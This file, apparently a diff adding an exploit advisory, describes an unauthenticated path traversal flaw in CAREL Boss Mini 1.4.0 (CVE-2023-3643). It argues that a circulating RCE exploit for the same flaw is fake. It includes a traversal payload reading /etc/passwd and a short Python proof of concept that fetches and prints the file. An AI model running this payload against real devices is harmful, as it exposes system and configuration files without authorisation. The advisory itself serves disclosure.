@@ -1,0 +1,98 @@
+=============================================================================================================================================
+| # Title     : Boss Mini 1.4.0 path traversal                                                                                              |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.carel.com/product/boss                                                                                          |
+=============================================================================================================================================
+
+[+] Summary : 
+
+A vulnerability has been identified in CAREL Boss and Boss Mini
+supervision devices running version 1.4.0.The weakness allows
+remote unauthenticated users to disclose sensitive information
+through a Local File Inclusion (LFI) vector due to improper input
+validation.
+
+Importantly, this vulnerability does NOT provide any form of RCE.
+
+[+] References
+
+Based on the public advisory published on Packet Storm  
+
+(https://packetstorm.news/files/id/177394/)  
+
+and the official CVE entry for **CVE-2023-3643**
+
+combined with a fulltechnical analysis of the exploitation flow, it has been conclusively
+confirmed that the widely circulated "Boss Mini 1.4.0 LFI 
+Log Poisoning" exploit is **fake, impossible, and non-functional**.
+
+The device does not run PHP, does not support log-based code execution,
+and the vulnerable endpoint does not allow any code interpretation.  
+Therefore, any exploit claiming **LFI → Log Poisoning → RCE** is  
+**technically impossible and must be considered false**.
+
+--------------------------------------------------------------------
+
+3. Affected Products
+---------------------
+- CAREL Boss Mini 1.4.0
+- CAREL Boss 1.4.0
+- Possibly earlier versions with similar structures
+
+--------------------------------------------------------------------
+
+4. Vulnerability Details
+-------------------------
+The vulnerable parameter **path** fails to sanitize directory traversal
+patterns, allowing attackers to read arbitrary files accessible by the
+web process.
+
+Example vulnerable pattern: /boss/document?path=../../../../etc/passwd
+
+This grants information disclosure but **cannot** escalate to RCE because
+the appliance lacks PHP or any script execution engine.
+
+--------------------------------------------------------------------
+
+5. Impact
+----------
+This vulnerability allows:
+- Reading system files
+- Accessing sensitive configuration data
+- Disclosure of internal JSON configuration structures
+
+This vulnerability **does NOT allow**:
+- Command execution  
+- Reverse shell  
+- Payload injection  
+- Any form of RCE  
+
+--------------------------------------------------------------------
+
+6. (PoC)
+-------------------------------
+```python
+#!/usr/bin/env python3
+# CVE-2023-3643 
+# Research: Indoushka 
+
+import requests
+
+target = "http://TARGET-IP"
+payload = "../../../../etc/passwd"
+
+url = f"{target}/boss/document?path={payload}"
+
+r = requests.get(url, timeout=10)
+
+if r.status_code == 200:
+    print("[+] Vulnerable! File contents:")
+    print(r.text)
+else:
+    print("[-] Not vulnerable or patched.")
+	
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
